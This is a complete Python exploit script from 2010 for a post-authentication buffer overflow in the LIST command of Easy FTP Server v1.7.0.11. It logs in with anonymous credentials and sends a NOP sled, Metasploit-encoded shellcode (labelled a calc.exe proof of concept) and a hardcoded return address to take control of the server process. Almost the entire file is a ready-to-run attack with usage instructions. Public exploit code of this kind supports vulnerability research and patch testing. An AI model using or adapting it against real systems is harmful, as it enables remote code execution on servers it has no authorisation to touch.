#!/usr/bin/python
import socket,sys

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]

print """
#
****************************************************************************
#									   #
*  Easy FTP Server v1.7.0.11 [LIST] Remote BoF Exploit Post Authentication *
*  Author / Discovered by : Karn Ganeshen 				   *
*  Date : July 5, 2010							   *
*  KarnGaneshen [aT] gmail [d0t] com     				   *
*  http://ipositivesecurity.blogspot.com				   *
#									   #
****************************************************************************
#
"""

if len(sys.argv) != 3:
    print "Usage: ./easyftp_LIST.py <Target IP> <Port>"
    sys.exit(1)
 
target = sys.argv[1]
port = int(sys.argv[2])

# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]

shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1"
"\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5"
"\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69"
"\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e"
"\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8"
"\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08"
"\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c"
"\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c"
"\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80"
"\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b"
"\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84"
"\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14"
"\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c"
"\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e"
"\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8"
"\x51\x6b\x28")

nopsled = "\x90" * 40
ret = "\x10\x3B\x88\00" # MAGIC RET 00883B10 [ CALL EDI ]
payload = nopsled + shellcode + ret 

print "[+] Launching exploit against " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    connect=s.connect((target, port))
    print "[+] Connected!"
except:
    print "[!] Connection failed!"
    sys.exit(0)

s.recv(1024)

# Targetting default user 'anonymous' on the target
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
print "[+] Sending payload..."
s.send('LIST ' + payload + '\r\n')
s.recv(1024)

print "[!] Verifying if LIST is enabled for the user. This may take some time..."

try:
    s.recv(1024)
    print "[!] Uhh.. User does not have LIST permissions. +++Exploit failed+++"

except:
    print "[+] +++Exploit Successful+++ ^_^"

s.close()
